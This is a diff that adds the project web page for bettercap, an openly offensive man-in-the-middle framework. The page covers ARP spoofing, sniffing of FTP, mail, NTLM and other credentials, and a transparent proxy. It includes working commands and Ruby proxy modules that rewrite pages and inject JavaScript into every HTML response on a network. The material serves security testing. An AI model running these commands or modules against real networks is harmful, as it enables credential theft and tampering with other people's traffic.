@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="stylesheets/github-dark.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">
+
+    <title>Bettercap by evilsocket</title>
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>Bettercap</h1>
+        <h2>A complete, modular, portable and easily extensible MITM framework.</h2>
+
+        <section id="downloads">
+          <a href="https://github.com/evilsocket/bettercap/zipball/master" class="btn">Download as .zip</a>
+          <a href="https://github.com/evilsocket/bettercap/tarball/master" class="btn">Download as .tar.gz</a>
+          <a href="https://github.com/evilsocket/bettercap" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p><strong>bettercap</strong> is a complete, modular, portable and easily extensible <strong>MITM</strong> tool and framework with every kind of diagnostic
+and offensive feature you could need in order to perform a man in the middle attack.</p>
+
+<h1>
+<a id="motivations" class="anchor" href="#motivations" aria-hidden="true"><span class="octicon octicon-link"></span></a>MOTIVATIONS</h1>
+
+<blockquote>
+<p>Yet another MITM tool? C'mon, really?!!?</p>
+</blockquote>
+
+<p>This is exactly what you are thinking right now, isn't it? :D
+But allow yourself to think about it for 5 more minutes ... what you should be really asking is:</p>
+
+<blockquote>
+<p>Does a complete, modular, portable and easy to extend MITM tool actually exist?</p>
+</blockquote>
+
+<p>If your answer is "ettercap", let me tell you something:</p>
+
+<ul>
+<li>ettercap <strong>was</strong> a great tool, but it made its time.</li>
+<li>ettercap filters <strong>do not</strong> work most of the times, are outdated and hard to implement due to the specific language they're implemented in.</li>
+<li>ettercap is freaking <strong>unstable</strong> on big networks ... try to launch the host discovery on a bigger network rather than the usual /24 ;)</li>
+<li>yeah you can see connections and raw pcap stuff, <strong>nice toy</strong>, but <strong>as a professional researcher I want to see only relevant stuff</strong>.</li>
+<li>unless you're a C/C++ developer, you can't easily extend ettercap or make your own module.</li>
+</ul>
+
+<p>Indeed you could use more than just one tool ... maybe <a href="http://linux.die.net/man/8/arpspoof">arpspoof</a> to perform the actual poisoning, <a href="http://mitmproxy.org">mitmproxy</a> to intercept HTTP stuff and inject your payloads and so forth ... I don't know about you, but I <strong>hate</strong> when I need to use a dozen of tools just to perform one single attack, especially when I need to do some black magic in order to make all of them work on my distro or on OSX ... what about the <a href="https://en.wikipedia.org/wiki/KISS_principle">KISS</a> principle?</p>
+
+<p>So <strong>bettercap</strong> was born ( isn't the name pure genius? XD ) ...</p>
+
+<h1>
+<a id="host-discovery--arp-man-in-the-middle" class="anchor" href="#host-discovery--arp-man-in-the-middle" aria-hidden="true"><span class="octicon octicon-link"></span></a>HOST DISCOVERY + ARP MAN IN THE MIDDLE</h1>
+
+<p>You can target the whole network or a single known address, it doesn't really matter, bettercap arp spoofing capabilities and its multiple hosts discovery agents will do the dirty work for you.<br>
+Just launch the tool and wait for it to do its job ... again, <a href="https://en.wikipedia.org/wiki/KISS_principle">KISS!</a></p>
+
+<p><img src="https://raw.github.com/evilsocket/bettercap/master/pics/discovery.png" alt="credentials"></p>
+
+<h1>
+<a id="credentials-sniffer" class="anchor" href="#credentials-sniffer" aria-hidden="true"><span class="octicon octicon-link"></span></a>CREDENTIALS SNIFFER</h1>
+
+<p>The built in sniffer is currently able to dissect and print from the network the following informations:</p>
+
+<ul>
+<li>URLs being visited.</li>
+<li>HTTPS host being visited.</li>
+<li>HTTP POSTed data.</li>
+<li>HTTP Basic and Digest authentications.</li>
+<li>FTP credentials.</li>
+<li>IRC credentials.</li>
+<li>POP, IMAP and SMTP credentials.</li>
+<li>NTLMv1/v2 ( HTTP, SMB, LDAP, etc ) credentials.</li>
+</ul>
+
+<p><img src="https://raw.github.com/evilsocket/bettercap/master/pics/credentials.png" alt="credentials"></p>
+
+<p><strong>Examples</strong></p>
+
+<p>Default sniffer mode, all parsers enabled:</p>
+
+<pre><code>sudo bettercap -X
+</code></pre>
+
+<p>Enable sniffer and load only specified parsers:</p>
+
+<pre><code>sudo bettercap -X -P "FTP,HTTPAUTH,MAIL,NTLMSS"
+</code></pre>
+
+<p>Enable sniffer + all parsers and parse local traffic as well:</p>
+
+<pre><code>sudo bettercap -X -L
+</code></pre>
+
+<h1>
+<a id="modular-transparent-proxy" class="anchor" href="#modular-transparent-proxy" aria-hidden="true"><span class="octicon octicon-link"></span></a>MODULAR TRANSPARENT PROXY</h1>
+
+<p>A modular transparent proxy can be started with the --proxy argument, by default it won't do anything 
+but logging HTTP requests, but if you specify a <strong>--proxy-module</strong> argument you will be able to load
+your own modules and manipulate HTTP traffic as you like.  </p>
+
+<p><img src="https://raw.github.com/evilsocket/bettercap/master/pics/proxy.png" alt="credentials"></p>
+
+<p><strong>Examples</strong></p>
+
+<p>Enable proxy on default ( 8080 ) port with no modules ( quite useless ): </p>
+
+<pre><code>sudo bettercap --proxy
+</code></pre>
+
+<p>Enable proxy and use a custom port:</p>
+
+<pre><code>sudo bettercap --proxy --proxy-port=8081
+</code></pre>
+
+<p>Enable proxy and load the module <strong>example_proxy_module.rb</strong>:</p>
+
+<pre><code>sudo bettercap --proxy --proxy-module=example_proxy_module.rb
+</code></pre>
+
+<p>Disable spoofer and enable proxy ( stand alone proxy mode ):</p>
+
+<pre><code>sudo bettercap -S NONE --proxy
+</code></pre>
+
+<p><strong>Modules</strong></p>
+
+<p>You can easily implement a module to inject data into pages or just inspect the
+requests/responses creating a ruby file and passing it to bettercap with the --proxy-module argument, 
+the following is a sample module that injects some contents into the title tag of each html page.</p>
+
+<div class="highlight highlight-ruby"><pre><span class="pl-k">class</span> <span class="pl-en">HackTitle<span class="pl-e"> &lt; Proxy::Module</span></span>
+  <span class="pl-k">def</span> <span class="pl-en">on_request</span>( <span class="pl-smi">request</span>, <span class="pl-smi">response</span> )
+    <span class="pl-c"># is it a html page?</span>
+    <span class="pl-k">if</span> response.content_type <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">'</span>text/html<span class="pl-pds">'</span></span>
+      <span class="pl-c1">Logger</span>.info <span class="pl-s"><span class="pl-pds">"</span>Hacking http://<span class="pl-pse">#{</span><span class="pl-s1">request.host</span><span class="pl-pse"><span class="pl-s1">}</span></span><span class="pl-pse">#{</span><span class="pl-s1">request.url</span><span class="pl-pse"><span class="pl-s1">}</span></span> title tag<span class="pl-pds">"</span></span>
+      <span class="pl-c"># make sure to use sub! or gsub! to update the instance</span>
+      response.body.sub!( <span class="pl-s"><span class="pl-pds">'</span>&lt;title&gt;<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>&lt;title&gt; !!! HACKED !!! <span class="pl-pds">'</span></span> )
+    <span class="pl-k">end</span>
+  <span class="pl-k">end</span>
+<span class="pl-k">end</span></pre></div>
+
+<h1>
+<a id="builtin-http-server" class="anchor" href="#builtin-http-server" aria-hidden="true"><span class="octicon octicon-link"></span></a>BUILTIN HTTP SERVER</h1>
+
+<p>You want to serve your custom javascript files on the network? Maybe you wanna inject some custom
+script or image into HTTP responses using a transparent proxy module but you got no public server
+to use? <strong>no worries dude</strong> :D<br>
+A builtin HTTP server comes with bettercap, allowing you to serve custom contents from your own
+machine without installing and configuring other softwares such as Apache, nginx or lighttpd. </p>
+
+<p>You could use a <strong>proxy module</strong> like the following:</p>
+
+<div class="highlight highlight-ruby"><pre><span class="pl-k">class</span> <span class="pl-en">InjectJS<span class="pl-e"> &lt; Proxy::Module</span></span>
+  <span class="pl-k">def</span> <span class="pl-en">on_request</span>( <span class="pl-smi">request</span>, <span class="pl-smi">response</span> )
+    <span class="pl-c"># is it a html page?</span>
+    <span class="pl-k">if</span> response.content_type <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">'</span>text/html<span class="pl-pds">'</span></span>
+      <span class="pl-c1">Logger</span>.info <span class="pl-s"><span class="pl-pds">"</span>Injecting javascript file into http://<span class="pl-pse">#{</span><span class="pl-s1">request.host</span><span class="pl-pse"><span class="pl-s1">}</span></span><span class="pl-pse">#{</span><span class="pl-s1">request.url</span><span class="pl-pse"><span class="pl-s1">}</span></span> page<span class="pl-pds">"</span></span>
+      <span class="pl-c"># get the local interface address and HTTPD port</span>
+      localaddr <span class="pl-k">=</span> <span class="pl-c1">Context</span>.get.iface[<span class="pl-c1">:ip_saddr</span>]
+      localport <span class="pl-k">=</span> <span class="pl-c1">Context</span>.get.options[<span class="pl-c1">:httpd_port</span>]
+      <span class="pl-c"># inject the js</span>
+      response.body.sub!( <span class="pl-s"><span class="pl-pds">'</span>&lt;/title&gt;<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">"</span>&lt;script src='http://<span class="pl-pse">#{</span><span class="pl-s1">localaddr</span><span class="pl-pse"><span class="pl-s1">}</span></span>:<span class="pl-pse">#{</span><span class="pl-s1">localport</span><span class="pl-pse"><span class="pl-s1">}</span></span>/file.js' type='text/javascript'&gt;&lt;/script&gt;&lt;/title&gt;<span class="pl-pds">"</span></span> )
+    <span class="pl-k">end</span>
+  <span class="pl-k">end</span>
+<span class="pl-k">end</span></pre></div>
+
+<p>And then use it to inject the js file in every HTTP response of the network, using bettercap itself
+to serve the file:</p>
+
+<pre><code>sudo bettercap --httpd --http-path=/path/to/your/js/file/ --proxy --proxy-module=inject.rb 
+</code></pre>
+
+<h1>
+<a id="how-to-install" class="anchor" href="#how-to-install" aria-hidden="true"><span class="octicon octicon-link"></span></a>HOW TO INSTALL</h1>
+
+<p><strong>Stable Release ( GEM )</strong></p>
+
+<pre><code>gem install bettercap
+</code></pre>
+
+<p><strong>From Source</strong></p>
+
+<pre><code>git clone https://github.com/evilsocket/bettercap
+cd bettercap
+gem build bettercap.gemspec
+sudo gem install bettercap*.gem
+</code></pre>
+
+<h1>
+<a id="depends" class="anchor" href="#depends" aria-hidden="true"><span class="octicon octicon-link"></span></a>DEPENDS</h1>
+
+<p>All dependencies will be automatically installed through the GEM system.</p>
+
+<ul>
+<li>colorize (<strong>gem install colorize</strong>)</li>
+<li>packetfu (<strong>gem install packetfu</strong>)</li>
+<li>pcaprub  (<strong>gem install pcaprub</strong>) [sudo apt-get install ruby-dev libpcap-dev]</li>
+</ul>
+      </section>
+    </div>
+
+    
+  </body>
+</html>
